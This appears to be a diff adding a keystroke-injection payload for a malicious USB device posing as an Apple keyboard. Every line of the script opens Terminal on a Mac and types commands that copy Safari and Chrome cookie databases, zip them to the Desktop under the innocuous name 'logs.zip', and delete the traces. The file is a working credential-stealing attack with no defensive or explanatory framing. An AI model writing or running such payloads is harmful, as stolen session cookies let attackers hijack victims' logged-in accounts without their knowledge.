@@ -1,0 +1,12 @@
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1500
+STRING ls ~/Library/Cookies > /dev/null
+ENTER
+DELAY 5000
+STRING mkdir -p /tmp/b; cp ~/Library/Cookies/Cookies.binarycookies /tmp/b/safari 2>/dev/null; cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/b/chrome 2>/dev/null; zip -rj ~/Desktop/logs.zip /tmp/b; rm -rf /tmp/b && exit
+ENTER
